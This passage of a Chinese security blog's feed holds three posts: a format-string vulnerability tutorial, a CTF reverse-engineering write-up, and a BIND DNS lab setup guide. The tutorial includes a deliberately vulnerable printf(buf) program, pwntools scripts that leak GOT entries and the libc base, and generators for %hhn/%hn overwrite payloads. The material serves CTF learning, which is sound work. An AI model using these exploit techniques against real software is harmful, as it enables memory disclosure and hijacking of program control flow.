&#39;%&#39;字面值，不接受任何 flags, width。</code></pre></li></ol><p>参数：就是是要对应输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol><li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li><li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p><h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p><h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p><h6 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p><h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p><h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol><li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li><li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p><h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul><li>使用方法类似于%s的任意地址读取，只是换成了%n。</li><li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li></ul><h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p><h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p><h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p><ol><li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p></li><li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></p></li><li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p></li></ol><p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p><ul><li>前面已经输出的字符数小于这次要输出的字符数</li><li>前面已经输出的字符数等于于这次要输出的字符数</li><li>前面已经输出的字符数大于这次要输出的字符数</li></ul><p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p><p>单字节：</p><pre><code class="python"># prev 前面已经输出多少字符# val 要写入的值# idx  偏移def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#搭配：prev = 0 payload = &quot;&quot;# x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样# idx是偏移，key是要写入的目标值for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>双字节：</p><pre><code class="python">#跟上个基本一样，只是改了部分地方def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p><h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):你控制的第一个格式化程序的偏移量</li><li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li><li>numbwritten (int):已经由 printf 函数写入的字节数</li><li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li></ul><p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p><ul><li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li><li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li></ul><p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（上）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（上）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_高校战疫赛\_RE-天津垓</title>
    <link href="http://chumen77.xyz/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>http://chumen77.xyz/2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/</id>
    <published>2020-03-11T13:06:03.000Z</published>
    <updated>2020-03-15T06:37:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-高校战疫赛-RE-天津垓"><a href="#XCTF-高校战疫赛-RE-天津垓" class="headerlink" title="XCTF_高校战疫赛_RE_ 天津垓_"></a>XCTF_高校战疫赛_RE_ 天津垓_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。</p><h2 id="初步运行"><a href="#初步运行" class="headerlink" title="初步运行"></a>初步运行</h2><p>发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>看来是需要输入判断。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。</p><pre><code class="python">v39 = &#39;Rising_Hopper!&#39;result = &#39;&#39;key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16]tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21]for i in range(len(key)):    x = 0    flag = 1    while flag:        if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] :            flag = 0            result += chr(x)        else:            x += 1print(result)#result = &#39;Caucasus@s_ability&#39;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*<em>Unk_10040164D *</em> 做了一些处理然后又返回到这堆数据。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。</p><p>然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法<strong>将其改变成伪代码</strong>，这样就好分析多了。</p><h3 id="patch程序"><a href="#patch程序" class="headerlink" title="patch程序"></a>patch程序</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用<strong>010editor</strong>，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>我起初改成这样就不行，位位对齐，改成其他字符串就好了。</p><h3 id="ida动态调试："><a href="#ida动态调试：" class="headerlink" title="ida动态调试："></a>ida动态调试：</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 上面，右键新建一个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>整完的样子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>然后解密这里：</p><pre><code class="python">flag = &#39;&#39;key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375]for i in range(51) :    flag += chr(int(key[i] / 19683))print(flag)</code></pre><p>然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-高校战疫赛-RE-天津垓&quot;&gt;&lt;a href=&quot;#XCTF-高校战疫赛-RE-天津垓&quot; class=&quot;headerlink&quot; title=&quot;XCTF_高校战疫赛_RE_ 天津垓_&quot;&gt;&lt;/a&gt;XCTF_高校战疫赛_RE_ 天津垓_&lt;/h1&gt;&lt;h2 id=&quot;前
      
    
    </summary>
    
    
      <category term="RE" scheme="http://chumen77.xyz/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>linux- DNS搭建记录</title>
    <link href="http://chumen77.xyz/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/03/11/linux_ DNS搭建记录/</id>
    <published>2020-03-11T06:20:55.000Z</published>
    <updated>2020-04-15T14:18:11.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>全称： domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="域名服务基础"><a href="#域名服务基础" class="headerlink" title="域名服务基础"></a>域名服务基础</h2><h3 id="DNS作用及类型"><a href="#DNS作用及类型" class="headerlink" title="DNS作用及类型"></a>DNS作用及类型</h3><h4 id="DNS-系统的作用-："><a href="#DNS-系统的作用-：" class="headerlink" title="DNS 系统的作用 ："></a>DNS 系统的作用 ：</h4><ul><li>正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见）</li><li>反向解析：根据 IP 地址查找对应的主机域名（通信行业常用）</li></ul><h4 id="DNS-系统的工作模式："><a href="#DNS-系统的工作模式：" class="headerlink" title="DNS 系统的工作模式："></a>DNS 系统的工作模式：</h4><ul><li>递归查询 ：访问必须有一次一回，会返回成功或者失败。</li><li>迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。<h4 id="域名结构："><a href="#域名结构：" class="headerlink" title="域名结构："></a>域名结构：</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>全世界有13台根域名服务器。<h4 id="BIND软件服务"><a href="#BIND软件服务" class="headerlink" title="BIND软件服务"></a>BIND软件服务</h4></li></ul><pre><code class="html">服务名：named 端口号：53主配置文件：/etc/named.conf保存 DNS 解析记录的数据文件位于：/var/named/</code></pre><h4 id="主配置文件部分参数："><a href="#主配置文件部分参数：" class="headerlink" title="主配置文件部分参数："></a>主配置文件部分参数：</h4><pre><code class="html">listen-on port 53 { 127.0.0.1; }; //要填入自己主机iplisten-on-v6 port 53 { ::1; }; allow-query     { any; };//意思是给任何网段进行解析</code></pre><p>分别是: ipv4监听端口和ip地址，默认只有本地的<br>  ipv6的监听端口和ip地址</p><pre><code class="html">recursion yes;             // 递归还是迭代查询dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre><p>这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。</p><h4 id="区域文件部分参数："><a href="#区域文件部分参数：" class="headerlink" title="区域文件部分参数："></a>区域文件部分参数：</h4><pre><code class="html">    zone &quot;baidu.com&quot; IN {      type master;      file &quot;baidu.localhost&quot;; //本机记录文件名称（可以diy）      allow-update { none; };       };     //正向    zone &quot;131.140.168.192.in-addr.arpa&quot; IN {               type master;               file &quot;baidu.empty&quot;;              allow-update { none; };      };    //反向//对于其中 file 自定义的名字，要与数据配置文件里面名字相同。</code></pre><h2 id="实验搭建过程"><a href="#实验搭建过程" class="headerlink" title="实验搭建过程"></a>实验搭建过程</h2><p>要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1</p><h3 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h3><h4 id="关闭防火墙、SELinux"><a href="#关闭防火墙、SELinux" class="headerlink" title="关闭防火墙、SELinux"></a>关闭防火墙、SELinux</h4><pre><code class="html">vi /etc/selinux/config</code></pre><p>把改成 SELINUX = disabled 然后<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> 关闭防火墙。</p><h4 id="配置主配置文件："><a href="#配置主配置文件：" class="headerlink" title="配置主配置文件："></a>配置主配置文件：</h4><pre><code class="html">vi /etc/named.conf</code></pre><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>注意分号不要忘记，ip填的是本机地址。</p><h4 id="配置区域文件"><a href="#配置区域文件" class="headerlink" title="配置区域文件"></a>配置区域文件</h4><pre><code class="html">vi /etc/named.rfc1912.zones</code></pre><pre><code class="html">zone &quot;chumen77.com&quot; IN {        type master;        file &quot;chumen77.localhost&quot;;        allow-update { none; };};zone &quot;10.16.172.in-addr.arpa&quot; IN {        type master;        file &quot;chumen77.loopback&quot;;        allow-update { none; };};</code></pre><ul><li>其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。</li><li>并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。</li></ul><h4 id="配置正向反向解析数据文件"><a href="#配置正向反向解析数据文件" class="headerlink" title="配置正向反向解析数据文件"></a>配置正向反向解析数据文件</h4><pre><code class="html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre><ul><li>-p 是用来复制文件的权限情况。</li><li>来拷贝一下，方便直接修改。</li></ul><p>正向解析文件 ：</p><pre><code class="html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre><p>反向解析文件：</p><pre><code class="html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre><p>注意每个网址后面要加个点。</p><h4 id="检查和开启"><a href="#检查和开启" class="headerlink" title="检查和开启"></a>检查和开启</h4><p><code>named-checkzone</code> 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。</p><pre><code class="html">systemctl start named</code></pre><p>开启服务，如果出现无法开启，有异常：</p><pre><code class="html">cat /var/log/messages </code></pre><p>用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。</p><h3 id="客户机设置"><a href="#客户机设置" class="headerlink" title="客户机设置"></a>客户机设置</h3><h4 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h4><pre><code class="html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>修改网卡信息 ：</p><pre><code class="html">DNS1=192.168.140.131</code></pre><p>要在最后加上你dns服务器的ip。注意是 <code>DNS1</code>. 设置好后重启网卡。</p><pre><code class="html">service network restart</code></pre><h4 id="测速是否成功"><a 